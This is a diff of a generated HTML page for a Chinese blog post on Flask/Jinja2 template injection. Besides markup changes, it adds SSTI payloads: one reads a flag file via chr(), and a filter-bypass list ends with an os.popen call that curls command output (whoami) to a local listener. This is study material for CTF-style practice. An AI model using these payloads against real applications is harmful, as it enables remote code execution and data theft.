@@ -11,13 +11,13 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="referrer" content="no-referrer">
   <!--more-->
-  <meta name="description" content="很早就想整理下模版注入，短学期完了正好没事干，先从flask开始，毕竟这个框架相对比较熟悉😀">
+  <meta name="description" content="&amp;gt; 很早就想整理下模版注入，短学期完了正好没事干，先从flask开始，毕竟这个框架相对比较熟悉😀">
 <meta name="keywords" content="SSTI">
 <meta property="og:type" content="article">
 <meta property="og:title" content="flask模版注入">
 <meta property="og:url" content="http://yoursite.com/2019/09/07/flask模版注入/index.html">
 <meta property="og:site_name" content="ddddhm | glotozz&#39;blog">
-<meta property="og:description" content="很早就想整理下模版注入，短学期完了正好没事干，先从flask开始，毕竟这个框架相对比较熟悉😀">
+<meta property="og:description" content="&amp;gt; 很早就想整理下模版注入，短学期完了正好没事干，先从flask开始，毕竟这个框架相对比较熟悉😀">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://i.loli.net/2019/09/07/DSzqNCFKnOGeAg9.png">
 <meta property="og:image" content="https://i.loli.net/2019/09/07/BYxCskfGPo9tpHI.png">
@@ -31,10 +31,10 @@
 <meta property="og:image" content="https://i.loli.net/2019/09/07/YiIR4FtPELxohgG.png">
 <meta property="og:image" content="https://i.loli.net/2019/09/07/dIqtMW8UsuojDTf.png">
 <meta property="og:image" content="https://i.loli.net/2019/09/07/v3FzBVYSKuCcm9r.png">
-<meta property="og:updated_time" content="2019-09-07T10:55:05.196Z">
+<meta property="og:updated_time" content="2019-09-07T13:02:14.247Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="flask模版注入">
-<meta name="twitter:description" content="很早就想整理下模版注入，短学期完了正好没事干，先从flask开始，毕竟这个框架相对比较熟悉😀">
+<meta name="twitter:description" content="&amp;gt; 很早就想整理下模版注入，短学期完了正好没事干，先从flask开始，毕竟这个框架相对比较熟悉😀">
 <meta name="twitter:image" content="https://i.loli.net/2019/09/07/DSzqNCFKnOGeAg9.png">
   
   
@@ -186,10 +186,8 @@
     <div class="article-entry" itemprop="articleBody">
       
         <meta name="referrer" content="no-referrer">
+> 很早就想整理下模版注入，短学期完了正好没事干，先从flask开始，毕竟这个框架相对比较熟悉😀
 
-<blockquote>
-<p>很早就想整理下模版注入，短学期完了正好没事干，先从flask开始，毕竟这个框架相对比较熟悉😀</p>
-</blockquote>
 <a id="more"></a>
 
 <h4 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h4><p>最简单的一段代码</p>
@@ -358,9 +356,12 @@
 </blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)</span><br></pre></td></tr></table></figure>
 
-<p>成功（参考资料，这里是用来针对过滤中括号[]）</p>
-<p>还剩chr()函数没获取成功，获取成功后如下操作即可</p>
+<p>这个也成功</p>
+<p>还剩chr()函数没获取成功，虽然已经解决了引号过滤问题。。。</p>
+<p>获取成功后如下操作即可</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;%set chr()=().__class__.__mro__[1].__subclasses__()[40]</span><br><span class="line">__init__.__globals__.__builtins__.chr %&#125;&#123;&#123;().__class__.__mro__[1].__subclasses__()[40](chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="绕过一些过滤（简单记录）"><a href="#绕过一些过滤（简单记录）" class="headerlink" title="绕过一些过滤（简单记录）"></a>绕过一些过滤（简单记录）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">中括号：getitem()和pop()</span><br><span class="line"></span><br><span class="line">引号：先获取chr()再将文件名拼接、借助request对象</span><br><span class="line"></span><br><span class="line">过滤双下划线：利用request或__getattr__</span><br><span class="line">过滤双括号：</span><br><span class="line">&#123;% if &apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&apos;curl http://127.0.0.1:7999/?i=`whoami`&apos;).read()==&apos;p&apos; %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
 
 <h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://www.freebuf.com/column/187845.html" target="_blank" rel="noopener">https://www.freebuf.com/column/187845.html</a></p>
 <p><a href="https://0day.work/jinja2-template-injection-filter-bypasses/" target="_blank" rel="noopener">https://0day.work/jinja2-template-injection-filter-bypasses/</a></p>
